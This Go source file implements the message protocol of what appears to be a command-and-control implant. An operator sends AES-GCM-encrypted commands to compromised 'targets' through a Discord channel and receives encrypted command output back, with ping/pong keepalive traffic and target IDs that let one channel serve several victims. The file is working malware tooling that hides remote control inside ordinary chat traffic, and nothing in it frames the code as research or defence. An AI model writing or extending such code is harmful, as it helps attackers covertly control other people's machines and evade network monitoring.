package protocol

import (
	"encoding/base64"
	"errors"
	"fmt"
	"regexp"
	"strings"

	"sasakbpf/internal/aesgcm"
)

// On-wire format (visible in Discord channel):
//
//   sd1:<targetID>:<base64(nonce||ct+tag)>
//
//   sd1ack:<targetID>:<base64(nonce||ct+tag)>   operator -> target
//
// Plain ack (no payload) used for noise/heartbeat keepalive is:
//
//   sd1ping:<targetID>
//   sd1pong:<targetID>
//
// Anything not matching the sd1 family is ignored by both sides.

const (
	PrefixCmd  = "sd1:"      // operator -> agent, encrypted command
	PrefixOut  = "sd1ack:"   // agent -> operator, encrypted output
	PrefixPing = "sd1ping:"
	PrefixPong = "sd1pong:"
)

type Kind int

const (
	KindUnknown Kind = iota
	KindCmd
	KindOut
	KindPing
	KindPong
)

type Message struct {
	Kind     Kind
	TargetID string
	Body     []byte // decrypted payload (nil for ping/pong)
}

// Encode produces an on-wire ciphertext line for commands or output.
func Encode(prefix, targetID, aesKeyHex string, plaintext []byte) (string, error) {
	bundle, err := aesgcm.Seal(aesKeyHex, plaintext)
	if err != nil {
		return "", fmt.Errorf("seal: %w", err)
	}
	return prefix + targetID + ":" + base64.StdEncoding.EncodeToString(bundle), nil
}

// Decode parses a raw channel message line. Returns kind + payload.
// targetFilter == "" accepts any targetID; otherwise mismatches return
// ErrNotForUs (silent ignore) so multi-target channels work.
var ErrNotForUs = errors.New("not for us")

// Target IDs default to hex (openssl rand -hex N) but we accept any
// compact printable identifier so /target can set arbitrary handles.
var lineRe = regexp.MustCompile(`^(sd1(?:ack)?):([A-Za-z0-9_\-]{1,64}):([A-Za-z0-9+/=]*)$`)

func Decode(line, targetID, aesKeyHex string) (*Message, error) {
	line = strings.TrimSpace(line)
	if strings.HasPrefix(line, PrefixPing) {
		tid := strings.TrimPrefix(line, PrefixPing)
		return &Message{Kind: KindPing, TargetID: tid}, nil
	}
	if strings.HasPrefix(line, PrefixPong) {
		tid := strings.TrimPrefix(line, PrefixPong)
		return &Message{Kind: KindPong, TargetID: tid}, nil
	}
	m := lineRe.FindStringSubmatch(line)
	if m == nil {
		return nil, errors.New("no match")
	}
	prefix, tid, b64 := m[1], m[2], m[3]
	if targetID != "" && tid != targetID {
		return &Message{Kind: KindUnknown, TargetID: tid}, ErrNotForUs
	}
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return nil, fmt.Errorf("b64: %w", err)
	}
	body, err := aesgcm.Open(aesKeyHex, raw)
	if err != nil {
		return nil, fmt.Errorf("open: %w", err)
	}
	kind := KindCmd
	if strings.HasPrefix(prefix, "sd1ack") {
		kind = KindOut
	}
	return &Message{Kind: kind, TargetID: tid, Body: body}, nil
}